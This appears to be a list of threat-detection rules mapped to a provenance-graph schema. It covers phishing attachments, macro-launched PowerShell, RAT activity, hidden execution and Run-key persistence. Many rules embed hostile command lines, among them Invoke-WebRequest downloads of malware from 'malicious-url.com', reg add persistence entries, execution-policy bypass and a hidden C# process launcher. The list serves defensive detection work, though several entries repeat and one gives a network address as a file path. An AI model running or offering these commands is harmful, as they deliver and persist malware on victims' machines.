1. **Identify Initial Access via Email for Concealment via PowerShell**  
   - Monitor for the creation of processes related to Outlook that involve email interactions. Specifically, look for emails with attachments named "malicious_script.ps1".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" (or similar path for Outlook)  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "malicious_script.ps1"  

2. **Identify Execution of Malicious PowerShell Script**  
   - Monitor for the execution of PowerShell with specific command line arguments that include `-ExecutionPolicy Bypass` and `-WindowStyle Hidden`.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `srcNode.Cmdline`: `powershell.exe -ExecutionPolicy Bypass -File "C:\\Users\\User\\Downloads\\malicious_script.ps1" -WindowStyle Hidden`  
     - `dstNode.Type`: null  

3. **Identify Concealment of Activity**  
   - Monitor for API calls related to `ShowWindow` or `CreateDesktop` that indicate attempts to run processes in a hidden state.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `relation`: "Process Create"  

4. **Identify Further Payload Execution**  
   - Monitor for PowerShell commands that download and execute additional payloads, particularly those that use `Invoke-WebRequest` and `Start-Process` with `-WindowStyle Hidden`.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `srcNode.Cmdline`: `Invoke-WebRequest -Uri "http://malicious-url.com/payload.exe" -OutFile "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"`  
     - `dstNode.Type`: "Process"  
     - `dstNode.Image`: "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"  

5. **Identify Registry Modification for Persistence**  
   - Monitor for registry modifications that add entries to ensure the malicious payload runs on startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
     - `srcNode.Cmdline`: `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe" /f`  
     - `dstNode.Type`: "Registry"  
     - `dstNode.Key`: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  

6. **Identify Initial Access via Document for Hidden Window Creation**  
   - Monitor for the creation of processes related to Microsoft Word that involve opening a document with a macro. Specifically, look for documents named "malicious_document.docm".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "malicious_document.docm"  

7. **Identify Execution of Malicious Macro**  
   - Monitor for the execution of macros in Microsoft Word that invoke PowerShell with hidden window properties.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"  
     - `srcNode.Cmdline`: `Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\path\\to\\script.ps1", vbHide`  
     - `dstNode.Type`: null  

8. **Identify Concealment of Activity in PowerShell**  
   - Monitor for PowerShell processes that run in a hidden state, particularly those that utilize API calls to `ShowWindow` or `GetConsoleWindow`.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `relation`: "Process Create"  

9. **Identify Payload Execution from PowerShell**  
   - Monitor for PowerShell commands that download additional malware or perform reconnaissance, particularly those that use `Invoke-WebRequest` and `Start-Process` with hidden properties.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `srcNode.Cmdline`: `Invoke-WebRequest -Uri "http://malicious-url.com/malware.exe" -OutFile "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"`  
     - `dstNode.Type`: "Process"  
     - `dstNode.Image`: "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"  

10. **Identify Registry Modification for Malware Persistence**  
    - Monitor for registry modifications that ensure malware runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
      - `srcNode.Cmdline`: `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Malware" /t REG_SZ /d "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe" /f`  
      - `dstNode.Type`: "Registry"  
      - `dstNode.Key`: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  

11. **Identify Remote Access Tool Installation via Email**  
    - Monitor for the execution of a remote access tool installer from an email attachment, specifically looking for executables named "rat_installer.exe".  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\explorer.exe"  
      - `dstNode.Type`: "File"  
      - `dstNode.Name`: "rat_installer.exe"  

12. **Identify Concealment of Remote Access Tool Activity**  
    - Monitor for network connections initiated by the RAT to its command and control server, indicating hidden operations.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\path\\to\\rat.exe"  
      - `dstNode.Type`: "Network"  
      - `dstNode.Dstaddress`: "C:\\attacker-command-and-control-server"  

13. **Identify Registry Modification for RAT Persistence**  
    - Monitor for registry modifications that ensure the RAT runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
      - `srcNode.Cmdline`: `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RAT" /t REG_SZ /d "C:\\path\\to\\rat.exe" /f`  
      - `dstNode.Type`: "Registry"  
      - `dstNode.Key`: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  

14. **Identify Exfiltration of Data via RAT**  
    - Monitor for network requests made by the RAT that indicate data exfiltration, particularly those using `Invoke-WebRequest`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\path\\to\\rat.exe"  
      - `dstNode.Type`: "Network"  
      - `dstNode.Dstaddress`: "http://malicious-url.com/exfiltrate"  

15. **Identify Execution of Hidden Scripts via Email**  
    - Monitor for the execution of PowerShell scripts that are triggered by email attachments, specifically those named "hidden_script.ps1".  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"  
      - `dstNode.Type`: "File"  
      - `dstNode.Name`: "hidden_script.ps1"  

16. **Identify Execution of Hidden Scripts**  
    - Monitor for PowerShell commands that execute scripts in hidden mode, particularly those using `-WindowStyle Hidden`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
      - `srcNode.Cmdline`: `powershell.exe -ExecutionPolicy Bypass -File "C:\\path\\to\\hidden_script.ps1" -WindowStyle Hidden`  
      - `dstNode.Type`: null  

17. **Identify Concealment of Activity in Hidden Scripts**  
    - Monitor for API calls related to `ShowWindow` or `GetConsoleWindow` that indicate attempts to run scripts in a hidden state.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
      - `relation`: "Process Create"  

18. **Identify Payload Execution from Hidden Scripts**  
    - Monitor for PowerShell commands that download additional malware or perform reconnaissance, particularly those that use `Invoke-WebRequest` and `Start-Process` with hidden properties.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
      - `srcNode.Cmdline`: `Invoke-WebRequest -Uri "http://malicious-url.com/malware.exe" -OutFile "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"`  
      - `dstNode.Type`: "Process"  
      - `dstNode.Image`: "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"  

19. **Identify Registry Modification for Malware Persistence**  
    - Monitor for registry modifications that ensure malware runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
      - `srcNode.Cmdline`: `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Malware" /t REG_SZ /d "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe" /f`  
      - `dstNode.Type`: "Registry"  
      - `dstNode.Key`: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  

20. **Identify Use of Application Properties for Concealment**  
    - Monitor for the execution of applications that are configured to run in a hidden state, particularly those named "malicious_app.exe".  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\path\\to\\malicious_app.exe"  
      - `dstNode.Type`: null  

21. **Identify Execution of Malicious Application**  
    - Monitor for the execution of applications with hidden properties, particularly those that use `start /B`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\explorer.exe"  
      - `srcNode.Cmdline`: `start /B "C:\\path\\to\\malicious_app.exe"`  
      - `dstNode.Type`: null  

22. **Identify Concealment of Activity in Malicious Application**  
    - Monitor for API calls related to `ShowWindow` that indicate attempts to run applications in a hidden state.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\path\\to\\malicious_app.exe"  
      - `relation`: "Process Create"  

23. **Identify Payload Execution from Malicious Application**  
    - Monitor for commands executed by the malicious application that download additional malware or perform reconnaissance, particularly those using `Invoke-WebRequest`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\path\\to\\malicious_app.exe"  
      - `srcNode.Cmdline`: `Invoke-WebRequest -Uri "http://malicious-url.com/malware.exe" -OutFile "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"`  
      - `dstNode.Type`: "Process"  
      - `dstNode.Image`: "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"  

24. **Identify Registry Modification for Application Persistence**  
    - Monitor for registry modifications that ensure the malicious application runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
      - `srcNode.Cmdline`: `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MaliciousApp" /t REG_SZ /d "C:\\path\\to\\malicious_app.exe" /f`  
      - `dstNode.Type`: "Registry"  
      - `dstNode.Key`: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  

25. **Identify Concealment through .NET Features**  
    - Monitor for the execution of .NET applications that utilize `ProcessStartInfo` to prevent the creation of a visible window.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\path\\to\\malicious_app.exe"  
      - `dstNode.Type`: null  

26. **Identify Execution of Malicious .NET Application**  
    - Monitor for the execution of .NET applications that download and execute additional malware, particularly those using `ProcessStartInfo` with hidden properties.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\path\\to\\malicious_app.exe"  
      - `srcNode.Cmdline`: `ProcessStartInfo startInfo = new ProcessStartInfo(); startInfo.FileName = "powershell.exe"; startInfo.Arguments = "-ExecutionPolicy Bypass -File \\"C:\\\\path\\\\to\\\\malware.ps1\\""; startInfo.WindowStyle = ProcessWindowStyle.Hidden; Process.Start(startInfo);`  
      - `dstNode.Type`: null  

27. **Identify Registry Modification for .NET Application Persistence**  
    - Monitor for registry modifications that ensure the malicious .NET application runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.  
    - Schema Fields:  
      - `srcNode.Type`: "Process"  
      - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
      - `srcNode.Cmdline`: `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MaliciousApp" /t REG_SZ /d "C:\\path\\to\\malicious_app.exe" /f`  
      - `dstNode.Type`: "Registry"  
      - `dstNode.Key`: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  